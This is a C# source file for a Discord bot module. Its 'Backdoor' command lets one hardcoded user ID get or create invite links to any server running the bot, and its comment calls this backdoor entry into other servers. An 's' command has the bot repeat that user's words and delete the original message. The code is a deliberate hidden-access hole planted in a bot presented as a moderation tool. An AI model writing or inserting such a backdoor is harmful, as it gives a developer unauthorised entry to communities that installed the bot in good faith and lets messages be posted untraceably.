using System;
using System.Collections.Generic;
using System.Threading.Tasks;
using System.Linq;

using Discord;
using Discord.Commands;
using Discord.WebSocket;

namespace Okami.Core.Moderation
{
    public class Backdoor : ModuleBase<SocketCommandContext>
    {
        [Command("Backdoor"), Summary("Get an invite to the server")] //this will invite you to any server that uses this bot. Backdoor entry into a different server
        public async Task BackdoorMod(ulong GuildID)
        {
            if (!(Context.User.Id == 185771131855175680))
            {
                await Context.Channel.SendMessageAsync(":x: You are not allowed to make me do that!");
                return;
            }

            if (Context.Client.Guilds.Where(x => x.Id == GuildID).Count() < 1)
            {
                await Context.Channel.SendMessageAsync(":x: You sure you know what you're doing? :x:" + GuildID);
                return;
            }
            SocketGuild Guild = Context.Client.Guilds.Where(x => x.Id == GuildID).FirstOrDefault();


            var Invites = await Guild.GetInvitesAsync();
            if (Invites.Count() < 1)
            {
                try
                {
                    await Guild.TextChannels.First().CreateInviteAsync();
                }
                catch (Exception ex)
                {
                    await Context.Channel.SendMessageAsync($":x: No... I am too lazy to do that, I wont create an invite for guild {Guild.Name} error ``{ex.Message}``");
                    return;
                }
            }
            Invites = null;
            Invites = await Guild.GetInvitesAsync();
            EmbedBuilder Embed = new EmbedBuilder();
            Embed.WithAuthor($"Invites for guild test: {Guild.Name}:", Guild.IconUrl);
            Embed.WithColor(40, 200, 150);
            foreach (var Current in Invites)
                Embed.AddField("Invite:", $"[Invite]({Current.Url})");

            await Context.Channel.SendMessageAsync("", false, Embed.Build());
        }
       

        
        [Command("s"), Summary("a command that works as a /say command")] //this will make the bot say something you write and then delete your message. 

        public async Task NAME([Remainder]string Text = null)
        {
            if (!(Context.User.Id == 185771131855175680)) //the command only works for me, no one else can use this command.
            {
                await Context.Channel.SendMessageAsync(":x: I'm not gonna say that!"); //The bot will say this if I am not the one using the command
                return;
            }
            else
            {
                await Context.Channel.SendMessageAsync(Text); //echoing/copying my sentence and saying it
                await Context.Message.DeleteAsync(); //deleting my message but leaving the echoed bot sentence 
            }
        }

    }
}
